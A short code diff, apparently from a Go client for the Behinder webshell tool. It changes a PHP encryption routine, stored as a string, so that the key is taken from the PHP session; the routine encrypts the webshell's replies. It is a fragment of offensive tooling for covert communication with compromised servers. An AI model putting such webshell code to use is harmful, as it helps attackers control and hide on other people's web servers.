@@ -43,7 +43,7 @@ type Behinder struct {
 }
 
 var defaultPHPEchoEncoder codecFunc = func(raw []byte) ([]byte, error) {
-	classBase64Str := "\nfunction encrypt($data,$key)\n{\nif(!extension_loaded('openssl'))\n{\nfor($i=0;$i<strlen($data);$i++) {\n$data[$i] = $data[$i]^$key[$i+1&15];\n}\nreturn $data;\n}else{\nreturn openssl_encrypt($data, 'AES128' , $key);\n}\n}"
+	classBase64Str := "\nfunction encrypt($data)\n{\n@session_start();\n$key = $_SESSION['k'];\nif(!extension_loaded('openssl'))\n{\nfor($i=0;$i<strlen($data);$i++) {\n$data[$i] = $data[$i]^$key[$i+1&15];\n}\nreturn $data;\n}else{\nreturn openssl_encrypt($data, 'AES128' , $key);\n}\n}"
 	return []byte(classBase64Str), nil
 }
 
